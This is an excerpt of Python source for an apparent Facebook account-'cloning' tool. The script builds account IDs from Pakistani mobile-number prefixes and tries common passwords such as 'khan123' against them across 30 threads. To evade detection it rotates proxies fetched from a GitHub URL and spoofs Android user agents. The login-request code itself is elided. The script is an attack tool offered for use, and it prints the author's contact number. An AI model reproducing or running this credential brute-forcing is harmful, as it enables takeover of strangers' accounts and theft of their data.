...
try:
    ...
    os.system('pip install mechanize pip install bs4  pip install requests pip install bs4 pip install rich')
...
twf = []
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/Professionals/main/.prox.txtz').text
 ...
 "Mozilla/5.0 (Linux; Android 11; Redmi K30i 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
  ...
  "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G977N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36",
   "Mozilla/5.0 (Linux; Android 11; Zenfone Max Pro M1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
	...
	"Mozilla/5.0 (Linux; Android 11; TECNO KF8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
...
\033[1;37m[+]==============================================
\033[1;37m[*]  \033[1;33mTOOL MAKER   :  SHAHID KHAN
\033[1;37m[*]  \033[1;33mFACEBOOK     :  SHAHID KHAN
\033[1;37m[*]  \033[1;33mGITHUB       :  SOON
\033[1;37m[*]  \033[1;33mWHATSAP      :  0341 9778301
\033[1;37m[*]  \033[1;33mTOOL VERSION :  xxxxx
\033[1;37m[*]  \033[1;33mTOOL STATUS  :  FREE
\033[1;37m[+]==============================================""")
...
def main():
    ...
    clear()
    print('\033[1;37m[+]==============================================') 
    print(f"\033[1;97m[1] \033[1;33mSTART CLONING ")
    print(f"\033[1;97m[2] \033[1;33mREPORT TO ADMIN")
    print(f"\033[1;97m[0] \033[1;91mEXIT ")
    print('\033[1;37m[+]==============================================') 
    mirwais = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m CHOOSE \033[1;37m: \033[1;37m")
    if mirwais in ["1","01"]:
        passx()
    elif mirwais in ["2","02"]:
        os.system("https://www.facebook.com/profile.php?id=100007150086235&mibextid=ZbWKwL")
        main()  
    elif mirwais in ["0","00"]:
       print('\033[1;92m \033[1;91m FUCK YOU BRO')
       exit()
    else:
...
def passx():
    ...
    print(logo)
    print('\033[1;37m[+]==============================================') 
    print("\033[1;97m[01] \033[1;33mPASS 7 DIGITS  & KHANKHAN PASS ")
    print("\033[1;97m[02] \033[1;33mPASS 7 DIGITS  & KHAN1234 PASS ")
    print("\033[1;97m[03] \033[1;33mPASS 7 DIGITS  & KHAN123 PASS ")
    print("\033[1;97m[04] \033[1;33mPASS 7 DIGITS  & KHAN1122 PASS ")
    print('\033[1;37m[+]==============================================') 
    mirwais = input("\033[1;37m SELECT METHOD : ")
    if mirwais in ["nn","nn"]:
       awm19()      
    elif mirwais in ["nnn","nnn"]:
       awm20()
    elif mirwais in ["01","1"]:
       awm21()       
    elif mirwais in ["02","2"]:
       awm22()       
    elif mirwais in ["03","3"]:
       awm23()
...
def awm21():
    ...
    print('\033[1;37m[+]==============================================')
    print('\033[1;37m For Example :\033[1;31m 0344 , 0310 , 0300 , 0318 , 0303')
    print('\033[1;37m[+]==============================================')
    code = input('\033[1;37m ENTER CODE: ')
    os.system("clear")
    print(logo)   
    print('\033[1;37m[+]==============================================')
    limit = int(input('\033[1;97m[+] EXAMPLE \033[1;91m: 1000, 2000, 5000, 10000\n\033[1;37m[+]==============================================\n\033[1;97m[+]\033[1;97m PUT IDS LIMIT \033[1;91m: \033[1;97m'))
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        tl = str(len(user))
        print('\033[1;37m[+]==============================================')
        print('\033[1;37m[+] \033[1;31mTotal ids  :\033[1;32m '+tl)
        print(f'\033[1;37m[+] \033[1;31mselected code :\033[1;32m '+code)
        print(f'\033[1;37m[+] \033[1;31muse airplane mood for speed up cloning')
        print('\033[1;37m[+]==============================================')
        for love in user:
            uid = code+love
            pwx = [love,'khankhan','khan123','khan1122']
